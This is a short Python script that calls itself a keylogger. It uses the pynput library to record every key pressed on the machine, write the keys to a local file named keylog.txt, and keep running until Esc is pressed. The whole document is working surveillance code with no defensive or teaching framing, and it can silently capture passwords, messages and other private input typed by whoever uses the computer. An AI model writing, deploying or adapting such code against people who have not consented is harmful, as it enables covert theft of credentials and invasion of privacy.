from pynput.keyboard import Key, Listener

# Define the path to the log file
log_file = "keylog.txt"

# Function to write keystrokes to the log file
def write_to_log(key):
    key = str(key)
    if key == 'Key.space':
        key = ' '
    elif key == 'Key.enter':
        key = '\n'
    elif key == 'Key.tab':
        key = '\t'
    elif key == 'Key.backspace':
        key = '[BACKSPACE]'
    else:
        key = key.replace("'", "")

    with open(log_file, 'a') as f:
        f.write(key)

# Function to handle key presses
def on_press(key):
    write_to_log(key)

# Function to handle key releases
def on_release(key):
    if key == Key.esc:
        # Stop listener if the Esc key is pressed
        return False

# Start the keylogger
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
